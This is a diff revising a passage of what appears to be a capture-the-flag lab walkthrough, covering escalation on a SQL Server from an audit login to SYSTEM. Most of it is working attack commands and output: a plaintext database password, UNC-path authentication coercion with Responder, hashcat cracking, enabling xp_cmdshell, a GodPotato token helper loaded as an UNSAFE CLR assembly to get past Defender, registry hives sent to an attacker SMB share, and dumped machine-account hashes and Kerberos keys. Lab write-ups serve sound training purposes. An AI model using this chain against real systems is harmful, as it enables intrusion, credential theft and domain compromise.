@@ -332,7 +332,7 @@ The reverse SOCKS proxy listened on Kali's `127.0.0.1:1080`. Nmap uses `-sT` her
 
 ## SQL Server: from audit login to SYSTEM
 
-The renderer environment had another connection string, this time for the audit database:
+The renderer environment exposed a second SQL connection string, this time for the audit database:
 
 ```text
 server=172.16.0.11
@@ -341,14 +341,43 @@ username=aegis_audit_publisher
 password=Rxd!Qw6n8sP..2bJ@Wpx-2026
 ```
 
-Using the SQL audit wrapper through the SOCKS proxy, I checked the login's role and the server configuration. The wrapper reads the renderer response automatically, or accepts the `AEGIS_RENDER_DB_*` variables documented in [REPRODUCTION.md](REPRODUCTION.md):
+This stage followed the chain:
+
+```text
+aegis_audit_publisher
+        │
+        ├── bulkadmin → OPENROWSET(BULK...)
+        │
+        └── UNC read → NetNTLMv2 for svc-mssql
+                            │
+                            └── password cracking
+                                      │
+                                      ▼
+                          svc-mssql → SQL sysadmin
+                                      │
+                                      └── xp_cmdshell
+                                              │
+                                              └── SeImpersonatePrivilege
+                                                        │
+                                                        ▼
+                                                   SQL CLR
+                                                        │
+                                                        ▼
+                                                      SYSTEM
+```
+
+### Enumerating the audit login
+
+The SQL host was reachable through the Chisel SOCKS pivot. The `mssql-audit.sh` wrapper connects through ProxyChains and either extracts the credential from the saved renderer response or reads the `AEGIS_RENDER_DB_*` environment variables documented in [REPRODUCTION.md](REPRODUCTION.md).
+
+I used it to enumerate the SQL Server version, login roles, database roles, and security-sensitive configuration:
 
 ```bash
 ./scripts/mssql-audit.sh \
   -file artifacts/mssql-audit-enum.sql
 ```
 
-The useful results were:
+Relevant results:
 
 ```text
 Microsoft SQL Server 2022 RTM (16.0.1000)
@@ -361,23 +390,89 @@ clr enabled=0
 show advanced options=0
 ```
 
-The login had `bulkadmin` and `db_owner`, but `xp_cmdshell` and CLR were off. `OPENROWSET(BULK...)` still allowed file reads as the SQL service. The included controls and rotated-log query revealed the service identity `ODYSSEY\svc-mssql`:
+The account did not initially have command execution:
+
+- `db_owner` applied to the `aegis_audit` database.
+- `bulkadmin` permitted server-side bulk-file operations.
+- `xp_cmdshell` and SQL CLR were disabled.
+
+The useful permission was `bulkadmin`. SQL Server performs `OPENROWSET(BULK...)` file operations through the SQL Server process, not through the remote SQL client. The following controls read a local Windows file and the SQL Server error logs:
 
 ```bash
-./scripts/mssql-audit.sh -file artifacts/mssql-bulk-controls.sql
-./scripts/mssql-audit.sh -file artifacts/mssql-errorlog-archives.sql
+./scripts/mssql-audit.sh \
+  -file artifacts/mssql-bulk-controls.sql
+
+./scripts/mssql-audit.sh \
+  -file artifacts/mssql-errorlog-archives.sql
 ```
 
-A UNC path in the next SQL query induced outbound authentication by that account. Start the capture listener in a separate attacker terminal, then run the query. Save the captured NetNTLMv2 line as `responses/svc-mssql.netntlmv2`:
+The successful local read confirmed that bulk operations ran in the SQL service context. A rotated startup log identified the Windows account running that service:
+
+```text
+ODYSSEY\svc-mssql
+```
+
+This established two distinct identities:
+
+```text
+aegis_audit_publisher   SQL-authenticated audit login
+ODYSSEY\svc-mssql       Windows account running SQL Server
+```
+
+### Capturing the SQL service account's authentication
+
+`OPENROWSET(BULK...)` also accepts UNC paths. When SQL Server attempts to open a path such as:
+
+```text
+\\10.10.15.156\share\probe.txt
+```
+
+Windows first authenticates to the remote SMB server. Because the original connection used SQL authentication, the outbound SMB request was made as the SQL Server service account, `ODYSSEY\svc-mssql`.
+
+The included `artifacts/mssql-unc-auth.sql` contains:
+
+```sql
+SELECT BulkColumn
+FROM OPENROWSET(
+  BULK '\\10.10.15.156\share\probe.txt',
+  SINGLE_CLOB
+) AS file_data;
+```
+
+If the current `tun0` address is different, update the IP in that SQL file before continuing.
+
+Start Responder on the attacker VPN interface:
 
 ```bash
 responder -I tun0 -v
 ```
 
+In another terminal, trigger the UNC access:
+
 ```bash
 ./scripts/mssql-audit.sh \
   -file artifacts/mssql-unc-auth.sql
+```
 
+The remote file did not need to exist. The SMB authentication occurred before Windows could determine whether `probe.txt` was available. Responder captured a NetNTLMv2 challenge-response for `svc-mssql`.
+
+A NetNTLMv2 response is neither the plaintext password nor a reusable NT hash. It can, however, be used to test password candidates offline. Save the captured line as:
+
+```text
+responses/svc-mssql.netntlmv2
+```
+
+Responder normally also writes captured responses under `/usr/share/responder/logs/`. The relevant line can be copied with:
+
+```bash
+rg --no-filename -i 'svc-mssql' \
+  /usr/share/responder/logs/SMB-NTLMv2-*.txt |
+  tail -n 1 > responses/svc-mssql.netntlmv2
+```
+
+Hashcat mode `5600` performs the offline password check:
+
+```bash
 hashcat -m 5600 -a 0 -O \
   --session odyssey-svc-mssql \
   --potfile-path responses/hashcat-odyssey.pot \
@@ -387,43 +482,82 @@ hashcat -m 5600 -a 0 -O \
   /usr/share/wordlists/rockyou.txt
 ```
 
-Hashcat recovered `cml958782` for `svc-mssql` (shown here with its account name; `--outfile-format 2` itself writes just the password):
+Hashcat recovered the service-account password:
 
 ```text
 svc-mssql:cml958782
 ```
 
-The account authenticated to SQL Server with Windows integrated authentication. It had the SQL `sysadmin` role, and separate Windows token enumeration showed `SeImpersonatePrivilege` enabled:
+The account name is shown above for clarity. Because `--outfile-format 2` was used, `responses/svc-mssql.cracked` contains only the password, which is the format expected by `mssql-svc.sh`.
+
+### Reconnecting as `svc-mssql`
+
+The recovered password allowed Windows-integrated SQL authentication as the domain service account:
 
 ```bash
 ./scripts/mssql-svc.sh \
   -file artifacts/mssql-svc-enum.sql
-
-./scripts/mssql-svc.sh \
-  -file artifacts/mssql-enable-command-enum.sql
 ```
 
-The checks returned:
+The account was mapped to SQL Server's `sysadmin` role:
 
 ```text
 SYSTEM_USER=ODYSSEY\svc-mssql
 IS_SRVROLEMEMBER('sysadmin')=1
-SeImpersonatePrivilege  Enabled
 ```
+
+A SQL `sysadmin` can change server-level configuration. The next query enabled advanced options and `xp_cmdshell`, then ran `whoami /priv` to inspect the Windows token assigned to commands launched by SQL Server:
+
+```bash
+./scripts/mssql-svc.sh \
+  -file artifacts/mssql-enable-command-enum.sql
+```
+
+The important result was:
+
+```text
+SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
+```
+
+For a `sysadmin`, `xp_cmdshell` executes in the SQL Server service context. SQL administrative access had therefore become operating-system command execution as `ODYSSEY\svc-mssql`, with `SeImpersonatePrivilege` enabled.
 
 ### SQL CLR and `user.txt`
 
-Defender blocked a token helper written to disk. The helper was rebuilt as a SQL CLR assembly, registered as trusted, and invoked through SQL Server. `build-token-helper.sh` retrieves the pinned GodPotato source revision when `tools/GodPotato` is absent:
+Initial attempts to run a standalone token helper were blocked by Defender. Instead, the same token-impersonation logic was compiled into a SQL CLR assembly.
+
+`build-token-helper.sh` retrieves the pinned GodPotato source revision and builds:
+
+```text
+artifacts/AuditWorker.exe
+artifacts/AuditWorkerSql.dll
+```
+
+The DLL includes `SqlEntry.cs`, which exposes the helper through a SQL stored procedure and returns its console output to the SQL client.
+
+Build and register the assembly:
 
 ```bash
 ./scripts/build-token-helper.sh
 ./scripts/load-auditworker-clr.sh
+```
 
+Because `svc-mssql` was a SQL `sysadmin`, the loader could:
+
+1. Enable SQL CLR.
+2. Register the assembly's SHA-512 hash as trusted.
+3. Create it with `PERMISSION_SET=UNSAFE`.
+4. Expose it as the `dbo.audit_token_exec` stored procedure.
+
+The DLL bytes were submitted through SQL rather than written as a DLL on the target filesystem. When invoked, the managed code ran inside the SQL Server process and inherited its enabled `SeImpersonatePrivilege`.
+
+Test the procedure:
+
+```bash
 ./scripts/mssql-svc.sh \
   -file artifacts/mssql-auditworker-clr-proof.sql
 ```
 
-The helper found a SYSTEM token:
+GodPotato used `SeImpersonatePrivilege` to trigger RPCSS authentication to a controlled named pipe. The initial `NETWORK SERVICE` identity shown below was the intermediate named-pipe client obtained during that RPC stage. The helper then located and duplicated a usable SYSTEM token:
 
 ```text
 [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
@@ -433,54 +567,73 @@ The helper found a SYSTEM token:
 nt authority\system
 ```
 
-The query executed in that context read `user.txt` from the Administrator desktop:
+The identities in this transition were therefore:
+
+```text
+ODYSSEY\svc-mssql      SQL login and SQL service context
+NETWORK SERVICE        Intermediate RPC impersonation identity
+NT AUTHORITY\SYSTEM    Final duplicated token
+```
+
+With SYSTEM execution confirmed, the stored procedure could read the local Administrator desktop. The query in `artifacts/mssql-system-user-proof.sql` was:
 
 ```sql
 EXEC dbo.audit_token_exec N'cmd.exe /c "echo USER_FLAG & type C:\Users\Administrator\Desktop\user.txt & echo LOCAL_ADMIN_DESKTOP & dir /a /b C:\Users\Administrator\Desktop & echo DOMAIN_ADMIN_DESKTOP & dir /a /b C:\Users\Administrator.ODYSSEY\Desktop"'
 ```
 
-Execution:
+Execute it through the service-account SQL session:
 
 ```bash
 ./scripts/mssql-svc.sh \
   -file artifacts/mssql-system-user-proof.sql
 ```
 
-The result was:
+Result:
 
 ```text
 [*] CurrentUser: NT AUTHORITY\SYSTEM
 USER_FLAG
-ee45f293e7319955838a73d4deb5429e
+[USER FLAG OMITTED]
 LOCAL_ADMIN_DESKTOP
 desktop.ini
 user.txt
 ```
 
-### Machine account credentials on the SQL host
+### Recovering the database-host machine identity
 
-SYSTEM access on the database host allowed the SAM, SECURITY, and SYSTEM registry hives to be exported. The SQL script writes to an authenticated temporary SMB share. Start the matching share in a separate attacker terminal before executing the export:
+SYSTEM access allowed the protected `SYSTEM`, `SECURITY`, and `SAM` registry hives to be saved. The `SYSTEM` hive contains the boot key needed to decrypt secrets stored in the other hives, while the `SECURITY` hive contains LSA secrets associated with the domain-joined machine.
+
+The export script copies the hives to an authenticated SMB share. Stop Responder before starting this server because both tools need to bind TCP port 445.
+
+Start the temporary SMB share in a separate attacker terminal:
 
 ```bash
 impacket-smbserver -smb2support \
-  -username exfil -password 'Exfil-2026-Temp!' \
+  -username exfil \
+  -password 'Exfil-2026-Temp!' \
   share "$PWD/smb-share"
 ```
 
-The saved hives were then processed locally:
+The export script contains the recorded attacker VPN address. Update `10.10.15.156` in `artifacts/mssql-system-export-hives.sql` if the current `tun0` address is different.
+
+Run the export:
 
 ```bash
 ./scripts/mssql-svc.sh \
   -file artifacts/mssql-system-export-hives.sql
+```
 
+Process the downloaded hives locally:
+
+```bash
 impacket-secretsdump \
   -system smb-share/od_sys.hiv \
   -security smb-share/od_sec.hiv \
-  -sam smb-share/od_sam.hiv LOCAL | \
+  -sam smb-share/od_sam.hiv LOCAL |
   tee responses/odyssey-db-secrets.txt
 ```
 
-Among the extracted secrets were the domain machine-account keys:
+Among the recovered LSA secrets were the domain credentials for the database host's machine account:
 
 ```text
 ODYSSEY\ODYSSEY-DB$:aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d:::
@@ -488,21 +641,35 @@ ODYSSEY-DB$ AES256: aaff0ce627d9bb964d1ab0bf189a3956673c4ab2dbdc2768766a90708e1d
 ODYSSEY-DB$ AES128: bde72605dccc9c3dc31b4b697a3fbb9d
 ```
 
-The domain controller was at `172.16.0.10`. Using the extracted machine-account hash, `bloody-machine.sh` checked group membership and writable directory objects:
+A domain machine account is an Active Directory security principal. Its NT hash or Kerberos keys can therefore be used to authenticate to domain services as `ODYSSEY-DB$`.
+
+Internal enumeration identified the domain controller at `172.16.0.10`. The `bloody-machine.sh` wrapper extracts the machine NT hash from `responses/odyssey-db-secrets.txt` and uses it to query Active Directory through the SOCKS proxy:
 
 ```bash
-./scripts/bloody-machine.sh get membership 'ODYSSEY-DB$'
-./scripts/bloody-machine.sh get writable \
-  --detail --partition DOMAIN --exclude-del
+./scripts/bloody-machine.sh \
+  get membership 'ODYSSEY-DB$'
+
+./scripts/bloody-machine.sh \
+  get writable --detail --partition DOMAIN --exclude-del
 ```
 
-The resulting path was:
+The effective-rights analysis found this nested group path:
 
 ```text
-ODYSSEY-DB$ -> Build Hosts -> Pipeline Trustees -> Attest Key Managers
+ODYSSEY-DB$
+  └── Build Hosts
+      └── Pipeline Trustees
+          └── Attest Key Managers
+```
+
+Through that membership chain, the machine account could modify a specific attribute on the build-service account:
+
+```text
 CN=svc-aegis-build,OU=Pipeline,DC=odyssey,DC=htb
 msDS-KeyCredentialLink: WRITE
 ```
+
+Write access to `msDS-KeyCredentialLink` enables the shadow-credential transition used in the next stage.
 
 ## Active Directory: machine account to deploy account
 
